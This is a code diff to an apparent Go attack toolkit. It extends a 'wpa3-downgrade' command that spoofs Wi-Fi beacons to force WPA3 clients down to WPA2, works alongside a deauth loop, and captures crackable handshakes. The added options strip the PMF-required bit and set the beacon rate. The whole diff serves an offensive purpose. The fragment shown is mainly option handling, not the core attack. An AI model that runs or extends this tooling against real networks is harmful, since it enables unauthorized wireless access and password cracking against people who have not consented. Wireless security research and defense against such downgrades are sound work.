@@ -629,12 +629,14 @@ var deauthCmd = &cobra.Command{
 func init() {
 	wpa3DowngradeCmd.Flags().Int("channel", 6, "802.11 channel for spoofed beacons")
 	wpa3DowngradeCmd.Flags().Int("duration", 0, "seconds to run (0 = until Ctrl+C)")
+	wpa3DowngradeCmd.Flags().Bool("no-strip-pmf", false, "keep PMF-required bit (default strips it)")
+	wpa3DowngradeCmd.Flags().Int("rate", 50, "beacon interval in milliseconds")
 }
 
 var wpa3DowngradeCmd = &cobra.Command{
 	Use:   "wpa3-downgrade <iface> <bssid> <ssid>",
 	Short: "Poison RSN IE to force WPA3→WPA2 transition for handshake capture",
-	Long:  "Spoofs beacon RSN IE advertising WPA2-PSK/CCMP instead of WPA3-SAE. " +
+	Long: "Spoofs beacon RSN IE advertising WPA2-PSK/CCMP instead of WPA3-SAE. " +
 		"Run alongside a deauth loop; clients that support both downgrade and emit " +
 		"crackable WPA2 4-way handshakes.",
 	Args: cobra.ExactArgs(3),
@@ -642,7 +644,14 @@ var wpa3DowngradeCmd = &cobra.Command{
 		iface, bssid, ssid := args[0], args[1], args[2]
 		ch, _ := cmd.Flags().GetInt("channel")
 		duration, _ := cmd.Flags().GetInt("duration")
+		stripPMF, _ := cmd.Flags().GetBool("no-strip-pmf")
+		rateMs, _ := cmd.Flags().GetInt("rate")
 		worker := NewWPA3Downgrade(iface, bssid, ssid, ch)
+		worker.StripPMF = !stripPMF
+		if rateMs < 10 {
+			rateMs = 10
+		}
+		worker.Rate = time.Duration(rateMs) * time.Millisecond
 		if err := worker.Run(); err != nil {
 			fmt.Printf("[-] downgrade failed: %v\n", err)
 			os.Exit(1)
